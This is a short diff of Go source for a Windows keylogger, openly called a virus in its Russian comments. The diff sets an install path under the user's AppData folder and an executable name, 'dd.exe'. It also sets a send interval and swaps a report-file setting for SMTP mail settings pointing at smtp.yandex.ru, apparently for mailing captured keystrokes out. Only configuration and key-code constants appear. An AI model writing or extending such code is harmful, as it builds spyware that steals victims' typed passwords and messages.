@@ -3,7 +3,15 @@ package components
 var Dir string = "C:\\Users\\"+getUserName()+"\\AppData\\Roaming\\FFF\\"//директория файла
 var FileName string = "dd.exe"//имя файла вируса
 var keyloggerInterval = 10// интервал отправки
-var FileReport string = "report.txt"
+var (
+	identetyMail = ""
+	userNameMail = ""
+	passwordMail = ""
+	hostSmtp     = "smtp.yandex.ru"
+	addrMail     = "smtp.yandex.ru:25"
+	fromMail     = ""
+	toMail       = ""
+)
 
 const( // Virtual-Key Codes
  	vk_BACK       = 0x08
